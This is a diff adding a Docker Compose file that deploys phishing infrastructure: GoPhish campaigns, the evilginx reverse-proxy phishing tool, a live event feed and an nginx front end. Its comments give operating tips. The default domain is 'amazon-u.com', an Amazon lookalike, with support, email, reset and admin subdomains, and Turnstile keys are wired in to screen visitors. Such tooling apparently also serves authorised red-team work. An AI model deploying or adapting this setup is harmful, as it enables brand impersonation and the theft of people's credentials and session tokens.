@@ -1,0 +1,151 @@
+# docker-compose.yml
+# Enhanced Docker Compose for evilgophish: Integrates evilginx3, GoPhish, evilfeed with nginx proxy.
+# Services: nginx (proxy), gophish (campaigns/stats), evilginx (phishing proxy), evilfeed (real-time).
+# Volumes: Persistent for data, configs, uploads (templates, phishlets, CSVs, logs).
+# Recommended Volumes:
+# - gophish_data: DB (gophish.db), templates, groups CSVs – persist campaigns.
+# - evilginx_data: Phishlets (YAML), templates (turnstile/forbidden.html), config – custom phishlets.
+# - evilfeed_data: Event logs – for auditing/feed persistence.
+# - uploads: Host-mounted for easy file uploads (CSVs, HTML templates) – bind mount.
+# - ssl: For certs – mount LetsEncrypt or self-signed.
+# - logs: Shared logs for all services – debugging.
+# Env: Via .env – secrets for APIs (Twilio, Turnstile, SMTP).
+# Ports: 80/443 external (phishing), local-only for admin/feed.
+# Best Practices:
+# - Security: Use docker secrets for env vars (docker secret create twilio_sid <file>).
+# - Volumes: Backup with docker volume ls/inspect; rsync host mounts.
+# - Networking: Isolated bridge net; add firewall (ufw/docker iptables).
+# - Healthchecks: Add healthcheck to services (e.g., curl admin ports).
+# - Logging: Driver json-file; rotate with max-size: 10m.
+# - Scaling: evilginx can handle multiple phishlets; no need for replicas.
+# - Updates: docker-compose pull; rebuild for code changes.
+# - Tips: Mount /dev/shm for temp if needed; use --cap-add=NET_ADMIN for evilginx iptables.
+
+version: '3.8'
+
+services:
+  nginx:
+    image: nginx:alpine
+    ports:
+      - "80:80"
+      - "443:443"
+    volumes:
+      - ./nginx.conf:/etc/nginx/nginx.conf:ro
+      - ssl:/etc/nginx/ssl:ro
+      - logs:/var/log/nginx
+    depends_on:
+      - evilginx
+      - gophish
+    restart: unless-stopped
+    networks:
+      - evilnet
+    logging:
+      driver: "json-file"
+      options:
+        max-size: "10m"
+        max-file: "3"
+
+  gophish:
+    build:
+      context: .
+      dockerfile: Dockerfile.gophish
+    ports:
+      - "127.0.0.1:3333:3333"
+    volumes:
+      - gophish_data:/app/data
+      - ./gophish/config.json:/app/config.json:ro
+      - uploads:/app/uploads
+      - logs:/app/logs
+    environment:
+      - GOPHISH_DB_PATH=/app/data/gophish.db
+      - SMTP_HOST=${SMTP_HOST:-smtp.gmail.com}
+      - SMTP_PORT=${SMTP_PORT:-587}
+      - SMTP_USER=${SMTP_USER}
+      - SMTP_PASS=${SMTP_PASS}
+      - TWILIO_ACCOUNT_SID=${TWILIO_ACCOUNT_SID}
+      - TWILIO_AUTH_TOKEN=${TWILIO_AUTH_TOKEN}
+      - TWILIO_PHONE=${TWILIO_PHONE}
+    command: ./gophish --admin ./config.json
+    depends_on:
+      - evilfeed
+    restart: unless-stopped
+    networks:
+      - evilnet
+    healthcheck:
+      test: ["CMD", "wget", "--spider", "http://localhost:3333"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
+  evilginx:
+    build:
+      context: .
+      dockerfile: Dockerfile.evilginx
+    volumes:
+      - evilginx_data:/app
+      - /etc/resolv.conf:/etc/resolv.conf:ro
+      - uploads:/app/uploads:ro  # Read phishlets/templates from host
+      - logs:/app/logs
+    environment:
+      - DOMAIN=${DOMAIN:-amazon-u.com}
+      - SUBDOMAINS=${SUBDOMAINS:-support,email,reset,admin}
+      - PROXY_ROOT=${PROXY_ROOT:-true}
+      - RID_REPLACEMENT=${RID_REPLACEMENT:-user_id}
+      - TURNSTILE_PUBLIC=${TURNSTILE_PUBLIC}
+      - TURNSTILE_PRIVATE=${TURNSTILE_PRIVATE}
+      - GOPHISH_DB=/app/data/gophish.db  # Access via shared volume? Use network or bind
+      - FEED_ENABLED=${FEED_ENABLED:-true}
+    command: >
+      sh -c "
+        evilginx -g /app/data/gophish.db
+        -turnstile $${TURNSTILE_PUBLIC:-none}:$${TURNSTILE_PRIVATE:-none}
+        $${FEED_ENABLED:+ -feed}
+      "
+    depends_on:
+      - gophish
+      - evilfeed
+    restart: unless-stopped
+    cap_add:
+      - NET_ADMIN
+    networks:
+      - evilnet
+    healthcheck:
+      test: ["CMD", "pgrep", "evilginx"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
+  evilfeed:
+    build:
+      context: .
+      dockerfile: Dockerfile.evilfeed
+    ports:
+      - "127.0.0.1:1337:1337"
+    volumes:
+      - evilfeed_data:/app/data
+      - gophish_data:/app/gophish_data:ro
+      - logs:/app/logs
+    environment:
+      - GOPHISH_DB=/app/gophish_data/gophish.db
+      - WEBSOCKET_PORT=1337
+    command: ./evilfeed
+    restart: unless-stopped
+    networks:
+      - evilnet
+    healthcheck:
+      test: ["CMD", "wget", "--spider", "http://localhost:1337"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
+volumes:
+  gophish_data:
+  evilginx_data:
+  evilfeed_data:
+  uploads:
+  ssl:
+  logs:
+
+networks:
+  evilnet:
+    driver: bridge
